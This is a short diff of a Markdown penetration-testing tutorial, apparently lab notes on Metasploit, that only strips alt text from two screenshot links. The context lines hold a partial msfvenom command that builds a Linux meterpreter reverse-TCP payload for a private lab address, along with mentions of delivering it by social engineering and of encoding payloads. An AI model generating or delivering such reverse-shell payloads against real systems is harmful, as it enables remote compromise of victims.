@@ -1597,7 +1597,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -f
 
 - 📌 *Platform and architecture are auto selected if not specified, based on the selected payload*
 
-![image-20230415192514206](.gitbook/assets/image-20230415192514206.png)
+![](.gitbook/assets/image-20230415192514206.png)
 
 The transferring method onto the target system depends on the type of the social engineering technique.
 
@@ -1632,7 +1632,7 @@ run
 
 Same example with the `linux/x86/meterpreter/reverse_tcp` Linux payload executed on the Kali VM.
 
-![image-20230415201253314](.gitbook/assets/image-20230415201253314.png)
+![](.gitbook/assets/image-20230415201253314.png)
 
 ### Encoding Payloads
 
